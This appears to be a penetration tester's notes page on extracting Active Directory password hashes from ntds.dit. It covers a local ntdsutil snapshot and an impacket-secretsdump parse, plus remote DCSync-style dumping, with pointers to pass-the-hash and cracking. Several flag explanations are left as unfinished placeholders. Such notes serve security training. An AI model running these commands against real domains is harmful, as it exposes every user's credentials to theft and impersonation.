# New Technologies Directory Services (NTDS)

### Resources

{% embed url="https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds" %}

{% embed url="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343(v=ws.11)" %}

{% embed url="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc732530(v=ws.11)" %}

{% embed url="https://www.semperis.com/blog/ntds-dit-extraction-explained/" %}

{% embed url="https://www.kali.org/tools/impacket/" %}

### What is NTDS?

New Technologies Directory Services (NTDS) is a database containing all Active Directory data, including objects, attributes, credentials, etc.

NTDS is located in the directory: `C:\Windows\NTDS`, and is encrypted to prevent data extraction from a target machine. Access to the `ntds.dit` file is disallowed since the file is used by Active Directory and will be locked.&#x20;

#### `ntds.dit`

This file which stands for the New Technology Directory Services Directory Information Tree, is the database for Active Directory Domain Services (AD DS). This database stores directory data such as password hashes and user details for all computer and users objects within the domain, and makes that data available to network users and administrators.&#x20;

{% embed url="https://jarrettgxz-sec.gitbook.io/windows/active-directory-ad/domain-service-ad-ds/ntds.dit" %}

### (1) Local dumping (with no credentials)

> Note that the methods discussed in this section only works with administrator access on the **Domain Controller** (**DC**). This is because we are working with the `ntds.dit` file, which is only present on the **DC**.

This attack can be performed when we have no credentials available, but have administrator access to the Domain Controller (DC).&#x20;

The following files are required to dump the contents of the NTDS file:

* C:\Windows\NTDS\ntds.dit
* C:\Windows\System32\config\SYSTEM
* C:\Windows\System32\config\SECURITY

Run the following command to dump the NTDS file (output in the `c:\temp` directory):

{% code title="PowerShell session on DC (with administrator access) " overflow="wrap" %}
```powershell
PS> ntdsutil.exe 'activate instance ntds' 'ifm' 'create full c:\temp' quit quit

# short form
PS> ntdsutil.exe 'ac i ntds' 'i' 'create full c:\temp' q q
```
{% endcode %}

* `ac i ntds:` short for ...
* `i:` short for ...
* `create full c:\temp:` ...
* `q q:` short for ...

We can now view the dumped files in the `c:\temp` directory, with the following structure:

* **Active Directory**
  * **ntds.dit**&#x20;
  * **ntds.jfm**
* **registry**
  * **SECURITY**
  * **SYSTEM**

Next, we can copy the 3 files listed above (`ntds.dit` and the other 2 registry directories: `SYSTEM` and `SECURITY`) to our attacker machine, before using the **impacket's secretsdump.py** tool to extract the hashes:

{% code title="Attacker machine" overflow="wrap" %}
```sh
$ impacket-secretsdump -security <path_to_SECURITY> -system <path_to_SYSTEM> -ntds <path_to_ntds.dit> LOCAL
```
{% endcode %}

* `-security`: SECURITY hive to parse
* `-sam:` SAM hive to parse
* -`ntds:`NTDS.DIT file to parse
* Note that the target is `LOCAL`

### (2) Remote dumping (with credentials)

For the following attack, we require credentials for a user with the following permissions:

a. Replicating Directory Changes

b. Replicating Directory Changes All

c. Replicating Directory Changes in Filtered Set

{% code title="Attacker machine" overflow="wrap" %}
```sh
$ impacket-secretsdump -just-dc <TARGET>
```
{% endcode %}

* `-just-dc`: Extract only NTDS.DIT data (NTLM hashes and Kerberos\
  keys)

{% code title="Attacker machine" overflow="wrap" %}
```sh
$ impacket-secretsdump -just-dc-ntlm <TARGET>
```
{% endcode %}

* `-just-dc-ntlm`: Extract only NTDS.DIT data (NTLM hashes only)

The value for the `<TARGET>` field will be the authenticated user (with the permissions listed above) in the form: `[[domain/]username[:password]@]`,eg. `test.loc/jarrett@x.x.x.x`.&#x20;

Now that we have obtained the hashes, we can either impersonate that user ([pass-the-hash](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/windows-active-directory/lateral-movement-and-pivoting/leveraging-alternate-authentication-materials/pass-the-hash-ntlm), etc.), or crack the hash using [hashcat](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/credentials-brute-force-cracking/tools/hashcat), etc. &#x20;
